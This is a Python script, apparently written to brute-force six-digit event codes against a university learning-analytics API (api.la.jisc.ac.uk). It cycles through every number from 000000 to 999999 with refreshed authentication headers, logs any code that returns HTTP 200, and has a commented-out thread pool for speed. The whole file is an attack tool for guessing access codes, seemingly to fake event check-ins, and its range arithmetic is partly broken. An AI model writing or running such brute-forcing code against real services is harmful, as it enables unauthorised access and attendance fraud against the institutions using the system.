import requests
import concurrent.futures
import threading
import time

class JiscCodeBreaker:
    def __init__(self, eventId, jiscTokenExtractor, searchValueLow=0, searchValueHigh=999999, threadCount=10):
        self.eventId = eventId
        self.threadCount = threadCount
        self.searchValueLow = searchValueLow
        self.searchValueHigh = searchValueHigh
        self.jiscTokenExtractor = jiscTokenExtractor
        self.HasCodeBeenFound = False
        self.url_template = "https://api.la.jisc.ac.uk/event/lookup/{:06d}?id={}"
        self.requestsBeforeRefresh = 50

    def process_group(self, thread_index, requestsPerGroup):
        start = self.searchValueLow + thread_index * requestsPerGroup
        end = start + requestsPerGroup-1
        self.MakeGroupRequests(start, end)

    def GetCode(self):
        searchRange = (self.searchValueHigh - self.searchValueLow) + 1
        requestsPerGroup = searchRange // self.threadCount

        self.process_group(0, requestsPerGroup)

        # with concurrent.futures.ThreadPoolExecutor(max_workers=self.threadCount) as executor:
        #     [executor.submit(self.process_group, self, i, requestsPerGroup) for i in range(self.threadCount)]

    def MakeGroupRequests(self, searchValueLow, requestsPerGroup):
        requestCounter = 0
        totalRequests = requestsPerGroup // self.requestsBeforeRefresh
                
        while not self.HasCodeBeenFound and requestCounter < totalRequests:
            headers = self.jiscTokenExtractor.GetJiscHeaders()
            lowRange = (requestCounter * self.requestsBeforeRefresh) + searchValueLow
            highRange = ((requestCounter + 1) * self.requestsBeforeRefresh)+ searchValueLow
            print(requestsPerGroup)
            print(requestCounter)
            print(headers)

            for number in range(lowRange,highRange):
                requestResult = self.MakeRequest(number, headers)
                if requestResult:
                    requestCounter = requestsPerGroup
                    break
            
            requestCounter += 1
            
    def MakeRequest(self, number, headers):
        response = requests.get(url=self.url_template.format(number, self.eventId), headers=headers)
        if response.status_code == 200:
            print(f"Success with number: {number}")
            with open('success.txt', 'a') as f:
                f.write(f"Success with number: {number}\n")
                f.write(f"{response.json()}\n\n")
            self.HasCodeBeenFound = True
            return True
        return False